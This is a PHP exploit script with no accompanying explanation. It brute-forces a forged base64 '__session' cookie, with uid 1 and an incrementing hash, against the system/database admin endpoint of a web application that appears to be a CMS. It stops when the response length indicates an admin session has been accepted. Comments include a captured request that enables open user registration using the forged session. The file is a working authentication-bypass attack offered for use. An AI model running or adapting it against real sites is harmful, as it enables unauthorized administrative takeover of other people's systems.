<?php
$i = 0;
while(true){
    $data = "{\"uid\":\"1\",\"hash\":$i}";
    $payload = "__session=".urlencode(base64_encode($data));
    
    $result = POST('wwwww.test.cn',80,'/web/index.php?c=system&a=database',$payload,10);
    print strlen($result);
    echo $data."\n";
    if(strlen($result)>5600){
        print "got it".$i."\n";
        echo $payload.'\n';
        break;
    }
    $i += 1;
}

// //http://www.test.net/web/index.php?c=system&a=welcome
// http://www.test.net/web/index.php?c=system&a=tools&do=bom&
// //Set-Cookie: 9817___session=eyJ1aWQiOiIxIiwiaGFzaCI6MH0=; path=/

// 开启注册
// POST /web/index.php?c=user&a=registerset& HTTP/1.1
// Host: www.test.net
// User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.12; rv:45.0) Gecko/20100101 Firefox/45.0
// Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
// Accept-Language: zh-CN,zh;q=0.8,en-US;q=0.5,en;q=0.3
// Accept-Encoding: gzip, deflate
// Referer: http://www.test.net/web/index.php?c=user&a=registerset&
// Cookie: UM_distinctid=15c6dd530fa449-0a4f4697fcbe82-48556c-13c680-15c6dd530fb3d0
// Connection: keep-alive
// Content-Type: application/x-www-form-urlencoded
// Content-Length: 112

// open=1&verify=0&code=1&groupid=1&submit=%E6%8F%90%E4%BA%A4&token=89f49332&__session=eyJ1aWQiOiIxIiwiaGFzaCI6NH0=



function POST($host,$port,$path,$data,$timeout) {

	$buffer='';
    $fp = fsockopen($host,$port,$errno,$errstr,$timeout);
    if(!$fp) die($host.'/'.$path.' : '.$errstr.$errno); 
	else {
        fputs($fp, "POST $path HTTP/1.0\r\n");
        fputs($fp, "Host: $host\r\n");
        fputs($fp, "Content-type: application/x-www-form-urlencoded\r\n");
        fputs($fp, "Content-length: ".strlen($data)."\r\n");
        fputs($fp, "Connection: close\r\n\r\n");
        fputs($fp, $data."\r\n\r\n");
		while(!feof($fp)) 
		{
			$buffer .= fgets($fp,4096);
		}

		fclose($fp);
    } 
	return $buffer;
}
?>
